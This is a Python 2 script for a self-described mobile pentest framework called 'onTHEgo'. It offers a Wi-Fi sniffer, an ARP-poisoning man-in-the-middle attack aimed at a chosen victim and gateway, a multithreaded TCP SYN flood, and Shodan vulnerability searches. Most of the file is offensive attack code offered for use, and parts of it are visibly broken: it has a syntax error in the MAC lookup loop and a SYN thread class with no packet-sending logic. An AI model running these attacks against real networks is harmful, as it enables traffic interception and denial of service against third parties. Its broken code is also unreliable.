#!/usr/bin/env python
import os, commands, cmd, sys, socket, time, threading
global key_file
key_file = 'key.txt'
try:
    from scapy.all import *
except ImportError:
    print "You are missing scapy"
    exit(1)
try:
    import shodan
except ImportError:
    print "You are missing shodan"
    exit(1)
"""
Mobile pentest platform for android (can be used on Linux/Mac too)
Author: _r3c0n_
Name: onTHEgo
Version: v.01
"""
"""
Options:
1: Host Info (Domain Info)
2: Wifi Sniffer
3: MITM
4: exit
"""
accepted_drones = ['parrot', 'parrot 2.0', 'parrot 2']
banner = """============================================
    onTHEgo mobile pentest framework
============================================
1. Host info (1 #url)\n2. Wifi Sniffer (2 #interface name)\n3. MITM Attack\n4. TCP SYN/ACK flood\n5. Shodan\n6. Exit
"""
print banner
class ONTHEGO(cmd.Cmd):
    prompt = 'oTg> '
    def do_1(self, line):
        info = socket.gethostbyname(line)
        print info
        print "\n" + banner
    def do_2(self, line):
        def PacketHandler(pkt):
            if pkt.type == 0 and pkt.subtype == 8:
                print " AP MAC: %s with SSID: %s " % (pkt.addr2, pkt.info)
        sniff(iface=line, prn = PacketHandler)
        print banner
    def do_3(self, line):
        # MITM code written by: THE DEFALT
        # wonderhowto link: http://null-byte.wonderhowto.com/how-to/build-man-middle-tool-with-scapy-and-python-0163525/
        try:
            interface = raw_input("[>] Interface to be used: ")
            victim = raw_input("[>] IP of Victim: ")
            gate = raw_input("[>] Router IP: ")
        except KeyboardInterrupt:
            print "\n[*] Shutting down"
            exit(1)
        print "\n[*] Port forwarding being enabled"
        commands.getoutput("echo 1 > /proc/sys/net/ipv4/ip_forward")
        def get_mac(IP):
            conf.verb = 0
            ans, unans = srp(Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst = IP), timeout = 2, iface = interface, inter = 0.1)
            for snd.rcv in ans:
                return rcv.sprintf(r"%Ether.src%")
        def reARP():
            print "\n[*] Restoring Targets..."
            victimMac = get_mac(victim)
            gateMac = get_mac(gate)
            send(ARP(op = 2, pdst = gate, psrc = victim, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = victimMac), count = 7)
            print "\n[*] Port Fowarding being disabled"
            commands.getoutput("echo 0 > /proc/sys/net/ipv4/ip_forward")
            print "[*] Shutting down"
            exit(1)
        def trick(gm, vm):
            send(ARP(op = 2, pdst = victim, psrc = gate, hwdst = vm))
            send(ARP(op = 2, pdst = victim, psrc = gate, hwdst = gm))
        # time for the MITM attack!
        def mitm():
            try:
                victimMAC = get_mac(victim)
            except Exception:
                print "[!] Failed to get victim MAC"
                print "Exiting"
                commands.getoutput("echo 0 > /proc/sys/net/ipv4/ip_forward")
                exit(1)
            try:
                gateMAC = get_mac(gate)
            except Exception:
                print "[!] Failed to get Router MAC"
                print "Exiting"
                commands.getoutput("echo 0 > /proc/sys/net/ipv4/ip_forward")
                exit(1)
            print "[*] Poising Targets"
            while(1):
                try:
                    trick(gateMAC, victimMAC)
                    time.sleep(1.5)
                except KeyboardInterrupt:
                    reARP()
                    break
        mitm()
        print banner
    def do_4(self, line):
        # tcp flood
        interface = None
        target = None
        port = None
        thread_limit = 200
        total = 0
        class sendSYN(threading.Thread):
            global target, port
            def __init__(self):
                threading.Thread.__init__(self)

        interface = raw_input("[>] Interface: ")
        target = raw_input("[>] Target: ")
        port = int(raw_input("[>] Port: "))
        print "Flooding %s:%i with SYN packets." % (target, port)
        while True:
            if threading.activeCount() < thread_limit:
                sendSYN().start()
                total += 1
                sys.stdout.write("\rTotal packets sent:\t\t\t%i" % total)
    def do_5(self, line):
        if line == "1":
            pass
        else:
            with open(key_file, 'r') as SHODAN_KEY:
                SHODAN_API_KEY = SHODAN_KEY.read().strip("\n")
                if SHODAN_API_KEY == "":
                    print "[!] No API key loaded. Run install.sh to insert one"
                else:
                    api = shodan.Shodan(SHODAN_API_KEY)
                print("1. Specific host\n2. Vulnerability\n3. Exit")
                shodan_type = raw_input("[>] Choice: ")
                if shodan_type == '1':
                    specific_ip = raw_input("[>] IP: ")
                    if specific_ip == "":
                        print "[!] No IP specified"
                    else:
                        host = api.host(specific_ip)
                        print "\n"
                        print "######## INFO FOR %s #########" % specific_ip
                        print "IP: %s\nOrganization: %s\nOperating System: %s" % (host['ip_str'], host.get('org', 'n/a'), host.get('os', 'n/a'))
                        for item in host['data']:
                            print "Port: %s\nBanner: %s" % (item['port'], item['data'])
                        print "##########################################"
                elif shodan_type == '2':
                    search_term = raw_input("[>] Search term: ")
                    if search_term == '':
                        print("[!] No search term specified")
                    else:
                        try:
                            results = api.search(search_term)
                            print "Results found: %s" % results['total']
                            for result in results['matches']:
                                print "IP: %s" % result['ip_str']
                                print result['data']
                                print ''
                        except shodan.APIError, e:
                            print "[!] Shodan error: %s" % e
                else:
                    pass
    def do_6(self, line):
        exit(1)
    def do_exit(self, line):
        exit(1)
    def do_EOF(self, line):
        exit(1)

# shell loop
if __name__ == '__main__':
    ONTHEGO().cmdloop()
